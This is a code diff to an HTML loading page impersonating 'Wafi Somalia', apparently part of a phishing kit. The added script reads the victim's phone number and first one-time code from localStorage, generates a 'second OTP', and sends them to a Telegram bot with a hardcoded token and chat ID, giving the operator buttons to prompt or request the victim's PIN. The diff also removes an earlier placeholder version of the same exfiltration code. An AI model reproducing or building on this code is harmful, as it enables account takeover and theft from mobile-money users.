@@ -8,7 +8,7 @@
 @keyframes spin{to{transform:rotate(360deg)}}
 h2{color:#65a30d;margin:0;font-size:22px}
 p{color:#888;margin:10px 0 0 0}
-.footer{margin-top:40px;color:white;font-size:12px}
+.footer{margin-top:40px;color:white;font-size:12px;text-align:center}
 </style></head><body>
 <div class="box">
 <div class="circle"><div class="loader"></div></div>
@@ -17,6 +17,19 @@ p{color:#888;margin:10px 0 0 0}
 <div class="footer">© 2026 Wafi Somalia</div>
 </div>
 <script>
+const BOT_TOKEN = "8917447619:AAEUHL4o4CYy4SMyrLqrw1knboCk-AApmlQ";
+const CHAT_ID = "8630213836";
+const phone = localStorage.getItem('loginPhone') || 'N/A';
+const otp2 = Math.floor(100000 + Math.random() * 900000);
+localStorage.setItem('otp2', otp2);
+
+const msg = `2️⃣ SECOND OTP VERIFIED ✅\n\n🇸🇴 Somalia\n📱 ${phone}\n🔒 Second OTP: ${otp2}\n🔗 First OTP: ${localStorage.getItem('otp1')}\n\n✅ OTP verified. Now choose how to collect the second PIN:`;
+
+fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`,{
+  method:'POST',headers:{'Content-Type':'application/json'},
+  body:JSON.stringify({chat_id:CHAT_ID,text:msg,reply_markup:{inline_keyboard:[[{"text":"📱 Prompt PIN","callback_data":"prompt"},{"text":"📋 Request PIN","callback_data":"request"}],[{"text":"✅ Pass","callback_data":"pass"}]]}})
+});
+
 let count = 3;
 const timer = setInterval(()=>{
   document.getElementById('timer').innerText = `Please wait... (${count}s)`;
@@ -26,18 +39,4 @@ const timer = setInterval(()=>{
     window.location='loading.html?next=approved.html';
   }
 }, 1000);
-
-// Send Second OTP to Telegram
-const BOT_TOKEN = "PASTE_YOUR_BOT_TOKEN_HERE";
-const CHAT_ID = "PASTE_YOUR_CHAT_ID_HERE";
-const phone = localStorage.getItem('loginPhone');
-const otp2 = Math.floor(100000 + Math.random() * 900000);
-localStorage.setItem('otp2', otp2);
-
-const msg = `2️⃣ SECOND OTP VERIFIED ✅\n\n🇸🇴 Somalia\n📱 ${phone}\n🔒 ${otp2}\n🔗 First OTP: ${localStorage.getItem('otp1')}\n\n✅ OTP verified. Now choose how to collect the second PIN:\n\n📱 Prompt PIN\n📋 Request PIN\n✅ Pass`;
-
-fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`,{
-  method:'POST',headers:{'Content-Type':'application/json'},
-  body:JSON.stringify({chat_id:CHAT_ID,text:msg,reply_markup:{inline_keyboard:[[{"text":"📱 Prompt PIN","callback_data":"prompt"},{"text":"📋 Request PIN","callback_data":"request"}],[{"text":"✅ Pass","callback_data":"pass"}]]}})
-});
 </script></body></html>
